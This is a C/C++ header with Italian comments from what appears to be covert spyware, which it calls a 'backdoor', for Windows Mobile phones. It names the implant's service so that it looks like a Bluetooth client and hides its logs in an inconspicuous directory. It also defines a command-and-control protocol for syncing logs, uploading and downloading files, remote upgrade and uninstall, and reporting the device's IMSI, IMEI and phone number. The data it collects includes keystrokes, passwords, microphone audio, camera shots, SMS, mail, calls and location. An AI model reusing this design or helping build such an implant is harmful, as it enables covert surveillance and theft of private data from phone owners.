#ifndef __Common_h__
#define __Common_h__

#pragma comment(linker, "/nodefaultlib:libc.lib")
#pragma comment(linker, "/nodefaultlib:libcd.lib")

/***
#include <ceconfig.h>
#if defined(WIN32_PLATFORM_PSPC) || defined(WIN32_PLATFORM_WFSP)
#define SHELL_AYGSHELL
#endif
***/

#ifdef _CE_DCOM
#define _ATL_APARTMENT_THREADED
#endif

#include <Windows.h>
///#include <commctrl.h>

#ifdef SHELL_AYGSHELL
#include <aygshell.h>
#pragma comment(lib, "aygshell.lib") 
#endif // SHELL_AYGSHELL


// C RunTime Header Files
#include <stdlib.h>
#include <malloc.h>
#include <memory.h>
#include <tchar.h>

#if defined(WIN32_PLATFORM_PSPC) || defined(WIN32_PLATFORM_WFSP)
#ifndef _DEVICE_RESOLUTION_AWARE
#define _DEVICE_RESOLUTION_AWARE
#endif
#endif

#ifdef _DEVICE_RESOLUTION_AWARE
#include "DeviceResolutionAware.h"
#endif

#if _WIN32_WCE < 0x500 && ( defined(WIN32_PLATFORM_PSPC) || defined(WIN32_PLATFORM_WFSP) )
#pragma comment(lib, "ccrtrtti.lib")
#ifdef _X86_	
#if defined(_DEBUG)
#pragma comment(lib, "libcmtx86d.lib")
#else
#pragma comment(lib, "libcmtx86.lib")
#endif
#endif
#endif

///#include <altcecrt.h>
#include <list>
#include <map>
#include <vector>
#include <new>
//#include <Tlhelp32.h>
#include <common_new\projects.h>
#include <string>
#include <sstream>

using namespace std;

/**
 * Define per il demo-mode
 */
//#define _DEMO
//#define DEMO_MODE // Demo mode active, beeping and demo string sent to the server
#define LOG_TO_DEBUGGER

#ifdef _DEMO
extern wstring g_StrDemo;

#define ADDDEMOMESSAGE(x) AddDemoMessage(x)
#define DISPLAYDEMOMESSAGE(x) DisplayDemoMessage(x)

#else

#define ADDDEMOMESSAGE(x)
#define DISPLAYDEMOMESSAGE(x)

#endif

/**
* Define per il debugging
*/
#ifdef _DEBUG
///#define DBG_MSG(x) MessageBox(NULL, x, L"DBG_MSG", MB_OK | MB_TOPMOST);
#define DBG_MSG(x) OutputDebugString(x);
///#define DBG_MSG_2(x, y) MessageBox(NULL, x, y, MB_OK | MB_TOPMOST);
#define DBG_MSG_2(x, y) OutputDebugString(x);OutputDebugString(y);

#define DBG_ERROR_VAL(x, f) {WCHAR dbgbuf[60]; wprintf_s(dbgbuf, L"Error: 0x%08x on function %s", x, f); ///MessageBox(NULL, dbgbuf, L"Error", MB_OK | MB_TOPMOST);}
#define DBG_PRINT(x) OutputDebugString(x);
#define DBG_TRACE(msg, prior, err) DebugTrace(msg, prior, err)
#define DBG_TRACE_STR(msg1, msg2, prior, err) { wstring msg = msg1; msg += msg2; DebugTrace((PWCHAR)msg.c_str(), prior, err); }
#define DBG_TRACE_3(msg1, msg2, msg3, prior, err) { wstring msg = msg1; msg += msg2; msg += msg3; DebugTrace((PWCHAR)msg.c_str(), prior, err); }
#define DBG_TRACE_INT(msg, prior, err, val) DebugTraceInt(msg, prior, err, val)
#define DBG_TRACE_VERSION DebugTraceVersion()
#define DBG_ALERT 6 // 0 - no debug, 7 - max verbosity
#else
#define DBG_MSG(x)
#define DBG_MSG_2(x, y)
#define DBG_PRINT(x)
#define DBG_ERROR_VAL(x, f)
#define DBG_TRACE(msg, prior, err)
#define DBG_TRACE_STR(msg1, msg2, prior, err)
#define DBG_TRACE_3(msg1, msg2, msg3, prior, err)
#define DBG_TRACE_INT(msg, prior, err, val)
#define DBG_TRACE_VERSION
#define DBG_ALERT 0
#endif

#define __STR2__(x) #x
#define __STR1__(x) __STR2__(x)
#define __LOC__ __FILE__ "("__STR1__(__LINE__)") : #warning: "

/**
* Estensione per i file di log e nomi comuni
*/
#define LOG_EXTENSION L".mob"
#define MARKUP_EXTENSION L".qmm"
#define LOG_DIR L"\\$MS313Mobile\\"
#define LOG_DIR_NAME L"$MS313Mobile"
#define LOG_DIR_PREFIX L"Q"			// Utilizzato per creare le Log Dir
#define LOG_DIR_FORMAT L"Q*"		// Utilizzato nella ricerca delle Log Dir
#define LOG_PER_DIRECTORY 500		// Numero massimo di log per ogni directory
#define MAX_LOG_NUM 25000			// Numero massimo di log che creeremo

#define SMS_DLL L"SmsFilter.dll"
#define SMS_DLL_PATH L"\\windows\\SmsFilter.dll"

#define MORNELLA_SERVICE L"bthclient"
#define MORNELLA_SERVICE_PATH L"services\\bthclient"
#define MORNELLA_SERVICE_DLL_A L"bthclient.dll"
#define MORNELLA_SERVICE_DLL_B L"bthobexclnt.dll"

/**
 * Lunghezza della chiave di cifratura utilizzata
 */
#define KEY_LEN 128

/**
 * Numero massimo di caratteri che grabbiamo dal titolo di una finestra
 */
#define MAX_TITLE_LEN 512

/**
 * Define per il recording della voce
 */
#define CHANNEL_INPUT 1

/**
* Define comuni
*/
#define BACKDOOR_VERSION (UINT)2012063004
#define PI (3.141592653589793)
#define MAX_ALLOCABLE_MEMORY 1024 * 1024 // 1 Mb (il define dovrebbe essere multiplo di 16)
#define LOG_DELIMITER 0xABADC0DE
#define FLASH 0 // Flash Memory
#define MMC1 1	// First MMC
#define MMC2 2	// Second MMC
#define LOG_URL_MARKER 0x20100713
///#define MAXINT 2147483647
///#define MAXUINT 4294967296

/**
 * Define per la sezione di upload/download dei file
 */
#define DOWNLOAD_CHUNK_SIZE 50 * 1024

/**
* Define per l'accesso concorrente
*/
#ifdef _DEBUG
#define WAIT_AND_SIGNAL(x)	if(_WaitForSingleObject(x, INFINITE) == WAIT_ABANDONED) OutputDebugString(L"ABANDONED"); ///MessageBox(NULL, L"ABANDONED", __FUNCTIONW__, MB_OK);
#define UNLOCK(x)			if(!_ReleaseMutex(x)){ WCHAR bulbasauro[400]; wprintf_s(bulbasauro, L"%s\n%s\n%s", __LINE__, __FUNCTIONW__, __FILEW__); OutputDebugString(L"Release Failed");} ///MessageBox(NULL, bulbasauro, L"Release Failed", MB_OK); }
#else
#define WAIT_AND_SIGNAL(x)	_WaitForSingleObject(x, INFINITE);
#define UNLOCK(x)			_ReleaseMutex(x);
#endif

#define SAFE_FREE(x) if (x) { free(x); x = NULL; }
#define SAFE_DELETE(x) if (x) { delete[](x); x = NULL; }
#define SPEEX_FREE	{ speex_encoder_destroy(state); speex_bits_destroy(&bits); }

#define SET_TIMESTAMP(x, y)    \
	ZeroMemory(&x, sizeof(x)); \
	(x).tm_year = (y).wYear;   \
	(x).tm_mon = (y).wMonth;   \
	(x).tm_mday = (y).wDay;    \
	(x).tm_hour = (y).wHour;   \
	(x).tm_min = (y).wMinute;  \
	(x).tm_sec = (y).wSecond;

/**
* Stato dell'agente
*/
#define MODULE_DISABLED	(UINT)0x1
#define MODULE_ENABLED	(UINT)0x2
#define MODULE_RUNNING	(UINT)0x3
#define MODULE_STOPPED	(UINT)0x4

/**
* Stato dei monitor
*/
#define EVENT_STOPPED	MODULE_STOPPED
#define EVENT_RUNNING	MODULE_RUNNING

/**
* Comandi per i monitor
*/
#define EVENT_STOP	EVENT_STOPPED

/**
* Comandi per l'agente
*/
#define AGENT_STOP	MODULE_STOPPED
#define AGENT_RELOAD	(UINT)0x1

/**
* Comandi generici
*/
#define NO_COMMAND 0

/**
 * Definizioni utilizzate dagli agenti nella scrittura dei log
 */
#define GPS_VERSION		(UINT)2008121901
#define CELL_VERSION	(UINT)2008121901

#define TYPE_GPS	(UINT)0x1
#define TYPE_CELL	(UINT)0x2

#define LOG_AUDIO_CODEC_SPEEX	(UINT)0x0;
#define LOG_AUDIO_CODEC_AMR		(UINT)0x1;

/**
* Parametri del protocollo (i comandi validi iniziano da 1 in poi)
*/
#define INVALID_COMMAND		(UINT)0x0	// Non usare
#define PROTO_OK			(UINT)0x1	// OK
#define PROTO_NO			(UINT)0x2	// Comando fallito o non e' stato possibile eseguirlo
#define PROTO_BYE			(UINT)0x3	// Chiusura di connessione
#define PROTO_CHALLENGE		(UINT)0x4	// CHALLENGE,16 byte da cifrare
#define PROTO_RESPONSE		(UINT)0x5	// RESPONSE,16 byte cifrati
#define PROTO_SYNC			(UINT)0x6	// Mandami i log
#define PROTO_NEW_CONF		(UINT)0x7	// NEW_CONF,# prendi la nuova conf lunga # bytes
#define PROTO_LOG_NUM		(UINT)0x8	// LOG_NUM,# stanno per arrivare # logs
#define PROTO_LOG			(UINT)0x9	// LOG,# questo log e' lungo # bytes
#define PROTO_UNINSTALL		(UINT)0xa	// Uninstallati
#define PROTO_RESUME		(UINT)0xb	// RESUME,nome,# rimandami il log "nome" a partire dal byte #
#define PROTO_DOWNLOAD		(UINT)0xc	// DOWNLOAD,nome: mandami il file "nome" (in WCHAR, NULL terminato)
#define PROTO_UPLOAD		(UINT)0xd	// UPLOAD,nome,directory,#: uppa il file "nome" lungo # in "directory"
#define PROTO_FILE			(UINT)0xe	// #, Sta per arrivare un file lungo # bytes
#define PROTO_ID			(UINT)0xf	// Id univoco della backdoor, embeddato in fase di configurazione
#define PROTO_INSTANCE		(UINT)0x10	// Id univoco che identifica il dispositivo dove gira la backdoor
#define PROTO_USERID		(UINT)0x11	// IMSI,# byte NON paddati del blocco (il blocco inviato e' paddato)
#define PROTO_DEVICEID		(UINT)0x12	// IMEI,# byte NON paddati del blocco (il blocco inviato e' paddato)
#define PROTO_SOURCEID		(UINT)0x13	// #telefono,# byte NON paddati del blocco (il blocco inviato e' paddato)
#define PROTO_VERSION		(UINT)0x14	// #,bytes versione della backdoor (10 byte)
#define PROTO_LOG_END		(UINT)0x15  // La spedizione dei log e' terminata
#define PROTO_UPGRADE		(UINT)0x16	// Tag per l'aggiornamento del core
#define PROTO_ENDFILE		(UINT)0x17  // Tag che indica la terminazione della fase di download dei file
#define PROTO_SUBTYPE		(UINT)0x18	// #,bytes che indicano la subversion "WINMOBILE"
#define PROTO_FILESYSTEM	(UINT)0x19	// DWORD profondita', DWORD lunghezza del path, WCHAR path

/**
 * Tipi di log (quelli SOLO per mobile DEVONO partire da 0xAA00
 */
#define LOGTYPE_FILEOPEN	0x0000
#define LOGTYPE_FILECAPTURE 0x0001	// in realta' e' 0x0000 e si distingue tra LOG e LOGF
#define LOG_MAGIC_CALLTYPE  0x0026
#define LOGTYPE_KEYLOG		0x0040
#define LOGTYPE_PRINT		0x0100
#define LOGTYPE_CALL		0x0140
#define LOGTYPE_CALL_SKYPE  0x0141
#define LOGTYPE_CALL_GTALK  0x0142
#define LOGTYPE_CALL_YMSG   0x0143
#define LOGTYPE_CALL_MSN    0x0144
#define LOGTYPE_CALL_MOBILE 0x0145
#define LOGTYPE_URL			0x0180
#define LOGTYPE_ADDRESSBOOK	0x0200
#define LOGTYPE_CALENDAR	0x0201
#define LOGTYPE_TASK		0x0202
#define LOGTYPE_MAIL		0x0210
#define LOGTYPE_SMS			0x0211
#define LOGTYPE_MMS			0x0212
#define LOGTYPE_LOCATION	0x0220
#define LOGTYPE_CALLLIST	0x0230
#define LOGTYPE_DEVICE		0x0240
#define LOGTYPE_INFO		0x0241
#define LOGTYPE_SKYPEIM		0x0300
#define LOGTYPE_MAIL_RAW	0x1001
#define LOGTYPE_APPLICATION	0x1011
#define LOGTYPE_LOCATION_NEW	0x1220
	// Sub-types del nuovo Location Log
	#define LOGTYPE_LOCATION_GPS	0x0001
	#define LOGTYPE_LOCATION_GSM	0x0002
	#define LOGTYPE_LOCATION_WIFI	0x0003
	#define LOGTYPE_LOCATION_IP		0x0004
	#define LOGTYPE_LOCATION_CDMA	0x0005

#define LOGTYPE_SNAPSHOT	0xB9B9
#define LOGTYPE_MIC			0xC2C2
#define LOGTYPE_CHAT		0xC6C6
#define LOGTYPE_DOWNLOAD	0xD0D0
#define LOGTYPE_UPLOAD		0xD1D1
#define LOGTYPE_CLIPBOARD	0xD9D9
#define LOGTYPE_CAMSHOT		0xE9E9
#define LOGTYPE_FILESYSTEM	0xEDA1 // Filesystem log
#define LOGTYPE_PASSWORD	0xFAFA
#define LOGTYPE_UNKNOWN		0xFFFF	// in caso di errore

/**
 * Parametri di ritorno della Send()
 */
#define SEND_OK			(UINT)0x1
#define SEND_RELOAD		(UINT)0x2
#define SEND_UNINSTALL	(UINT)0x3
#define SEND_FAIL		(UINT)0x4
#define SEND_STOP		(UINT)0x5

/**
 * Parametri per la coda IPC
 */
#define IPC_PROCESS		(UINT)0x1
#define IPC_HIDE		(UINT)0x2

/**
 * Parametri di configurazione per il Crisis Agent
 */
#define CRISIS_NONE		(UINT)0x0
#define CRISIS_POSITION	(UINT)0x1
#define CRISIS_CAMERA	(UINT)0x2
#define CRISIS_MIC		(UINT)0x4
#define CRISIS_CALL		(UINT)0x8
#define CRISIS_SYNC		(UINT)0x10
#define CRISIS_ALL		(UINT)0xffffffff

typedef struct _ConfStruct {
	UINT uConfId;		// Id dell'opzione
	UINT uParamLength;	// Lunghezza della memoria allocata per pParams
	PVOID pParams;		// Puntatore alla lista dei parametri
} ConfStruct, *pConfStruct;

/**
* Definizione delle principali strutture comuni
*/
// WARNING - Non cambiare l'ordine dei primi 4 parametri della struttura
// altrimenti sara' necessario riscrivere il codice di parsing della configurazione.
typedef struct _AgentStruct {
	wstring wAgentId;
	UINT uAgentId;		// Id dell'agente
	UINT uAgentStatus;	// Running, Stopped
	UINT uParamLength;	// Lunghezza della memoria allocata per pParams
	PVOID pParams;		// Puntatore alla lista dei parametri
	PVOID pFunc;		// Thread start routine
	UINT uCommand;		// Viene utilizzato per comunicare all'agente
} AgentStruct, *pAgentStruct;

// WARNING - Non cambiare l'ordine dei primi 4 parametri della struttura
// altrimenti sara' necessario riscrivere il codice di parsing della configurazione.
typedef struct _EventStruct {
	UINT uEventType;	// Tipo di evento (Timer, sms, call etc...)
	UINT uActionId;		// Id dell'azione da eseguire 
	UINT uParamLength;	// Lunghezza della memoria allocata per pParams
	PVOID pParams;		// Puntatore alla lista dei parametri
	PVOID pFunc;		// Monitor start routine
	UINT uEventStatus;	// Running, Stopped
	UINT uCommand;		// Viene utilizzato per comunicare col monitor
} EventStruct, *pEventStruct;

// WARNING - Non cambiare l'ordine dei primi 3 parametri della struttura
// altrimenti sara' necessario riscrivere il codice di parsing della configurazione.
typedef struct _ActionStruct {
	UINT uActionType;	// Tag che identifica l'azione
	UINT uParamLength;	// Lunghezza del buffer allocato per pParams
	PVOID pParams;		// Puntatore alla lista dei parametri
} ActionStruct, *pActionStruct;

typedef struct _MacroActionStruct {
	UINT uSubActions;		// Numero di strutture ActionStruct presenti
	pActionStruct pActions; // Puntatore ad un array di ActionStruct
	BOOL bTriggered;		// L'azione e' stata triggerata da un evento
} MacroActionStruct, *pMacroActionStruct;

typedef struct _TimerStruct {
	UINT uType;
	UINT Lo_Delay;
	UINT Hi_Delay;
	UINT uEndAction;
} TimerStruct, *pTimerStruct;

typedef struct _EventConf {
	UINT uNum;		// Numero di eventi
	PVOID pParams;	// Parametri (Lunghezza, ID azione, Parametri / Lunghezza, ID azione, Parametri......)
} EventConf, *pEventConf;

#pragma pack(4)
typedef struct _IpcMsg {
	UINT dwSender;		// ID del mittente	
	UINT dwRecipient;	// ID dell'evento/agente di destinazione
	UINT dwForwarded;	// Viene incrementato di 1 dopo ogni forward
	UINT dwMsgLen;		// Lunghezza del messaggio (NON deve superare i: 4Kb - sizeof(IpcMsg)
	BYTE Msg[1];		// Il messaggio vero e proprio
	BYTE bReserved[3];	// Per il packing
} IpcMsg, *pIpcMsg;
#pragma pack()

/**
* Subito dopo la struttura scriviamo il nome del file in WCHAR, la struttura addizionale
* se necessaria e poi i dati di seguito. Non cambiare MAI l'ordine dei primi 2 membri!
* LOG_VERSION di questa struttura: 0.1
*/
// La PRIMA dword e' in chiaro e indica: sizeof(LogStruct) + uDeviceIdLen + uUserIdLen + uSourceIdLen + uAdditionalData
// ed e' paddata a 16 byte poiche' l'header e' cifrato. Tramite questa dword si puo' sapere da dove parte il
// primo byte di dati effettivi.
typedef struct _LogStruct {
#define LOG_VERSION_01 (UINT)2008121901
	UINT uVersion;			// Versione della struttura
	UINT uLogType;			// Tipo di log
	UINT uHTimestamp;		// Parte alta del timestamp
	UINT uLTimestamp;		// Parte bassa del timestamp
	UINT uDeviceIdLen;		// IMEI/Hostname len
	UINT uUserIdLen;		// IMSI/Username len
	UINT uSourceIdLen;		// Numero del caller/IP len
	UINT uAdditionalData;	// Lunghezza della struttura addizionale, se presente
} LogStruct, *pLogStruct;

typedef struct _SnapshotAdditionalData {
	UINT uVersion;
#define LOG_SNAPSHOT_VERSION (UINT)2009031201
	UINT uProcessNameLen;
	UINT uWindowNameLen;
} SnapshotAdditionalData, *pSnapshotAdditionalData;

typedef struct _UrldditionalData {
	UINT uVersion;
#define LOG_URL_VERSION 2009032301
	UINT uBrowserType;
	UINT uUrlLen;
	UINT uWindowLen;
} UrlAdditionalData, *pUrlAdditionalData;

typedef struct _LocationAdditionalData {
	UINT uVersion;
#define LOG_LOCATION_VERSION (UINT)2010082401
	UINT uType;
	UINT uStructNum;
} LocationAdditionalData, *pLocationAdditionalData;

/**
 * Struttura dell'additional header per i file della download queue
 */
typedef struct _LogDownload {
	UINT uVersion;
#define LOG_FILE_VERSION (UINT)2008122901
	UINT uFileNameLen;
} LogDownload, *pLogDownload;

/**
 * Struttura utilizzata per il sorting dei log
 */
typedef struct _LogInfo {
	wstring strLog;
	ULARGE_INTEGER date;
} LogInfo, *pLogInfo;

/**
 * Struttura utilizzata dalla UberLog per la rappresentazione del directory tree
 */
typedef struct _LogTree {
	wstring strDirName; // Directory Name
	UINT uHash;			// Filename hash
	UINT uOnMmc;		// 0 - No, 1 - First MMC, 2 - Second MMC
	UINT uLogs;			// Number of logs
} LogTree;

/**
 * Struttura utilizzata dalla superclass UberLog
 */
typedef struct _UberStruct {
	wstring strLogName;
	UINT uLogType;
	FILETIME ft;
	UINT uOnMmc; // 0 - No, 1 - First MMC, 2 - Second MMC
	BOOL bInUse;
} UberStruct, *pUberStruct;

/**
 * Struttura che definisce gli APN
 */
typedef struct _ApnStruct {
	UINT uMCC;        // Mobile Country Code
	UINT uMNC;        // Mobile Network Code
	UINT uApnLen;     // Lunghezza in BYTE del nome dell'APN incluso il NULL
	WCHAR *wApn;        // APN in WCHAR NULL-terminato
	UINT uApnUserLen; // Lunghezza in BYTE dell'username incluso il NULL
	WCHAR *wApnUser;    // APN Username in WCHAR NULL-terminato
	UINT uApnPassLen; // Lunghezza in byte della password incluso il NULL
	WCHAR *wApnPass;    // APN Password in WCHAR NULL-terminata
} ApnStruct, *pApnStruct;

/**
 * Struttura per la definizione degli AP in vista
 */
typedef struct _WiFiData {
	UCHAR MacAddress[6];	// BSSID
	UINT uSsidLen;			// SSID length
	UCHAR Ssid[32];			// SSID
	INT iRssi;				// Received signal strength in dBm
} WiFiData, *pWiFiData;

/**
* Qui definiamo tutti gli extern delle variabili globali necessarie
* al funzionamento della backdoor. Le definizioni si trovano in Common.cpp
*/
extern DWORD		g_Version;
extern BYTE			g_Subtype[];
extern BYTE			g_AesKey[];
extern BYTE			g_ConfKey[];
extern BYTE			g_InstanceId[];
extern BYTE			g_BackdoorID[];
extern BYTE			g_Challenge[];
extern BYTE			g_DemoMode[];
extern WCHAR		g_ConfName[];
extern wstring		g_strOurName;
extern HANDLE		g_hSmsQueueRead, g_hSmsQueueWrite;

// HINSTANCE del modulo
static HINSTANCE g_hInstance;

/**
* Definizione delle funzioni helper comuni
*/
#define LOOP for(;;)
#define HEX(c)  ((c) <= '9' ? (c) - '0' : (c) <= 'F' ? (c) - 'A' + 0xA : (c) - 'a' + 0xA)
#define ASCII(c) ((c) <= 9 ? (c) + '0' : (c) + 'A' - 0xA)

// Define per la funzione di hash delle stringhe
#define FNV1_32_INIT 0x811c9dc5
#define FNV1_32_PRIME 0x01000193

wstring GetCurrentPath(const PWCHAR pInFile);
wstring GetCurrentPathStr(const wstring &strInFile);
wstring GetFirstMMCPath(const PWCHAR pInFile);
wstring GetSecondMMCPath(const PWCHAR pInFile);
HANDLE GetProcessHandle(const PWCHAR wProcessName);
BOOL GetProcessName(DWORD dwId, wstring &strProcName);
UINT WideLen(const PWCHAR p);
unsigned __int64 GetTime();
unsigned __int64 DiffTime(unsigned __int64 new_time, unsigned __int64 old_time);
UINT GetUsedPhysMemory();
void AddDemoMessage(const PWCHAR pwMessage);
void DisplayDemoMessage(const PWCHAR pwMessage = NULL);
void DebugTrace(const PWCHAR pwMsg, UINT uPriority, BOOL bLastError);
void DebugTraceVersion();
void DebugTraceInt(const PWCHAR pwMsg, UINT uPriority, BOOL bLastError, INT iVal);
UINT FnvHash(BYTE *pBuf, UINT uLen);
void SetLedStatus(int wLed, int wStatus);
void BlinkLeds();
void TurnOffLeds();
#endif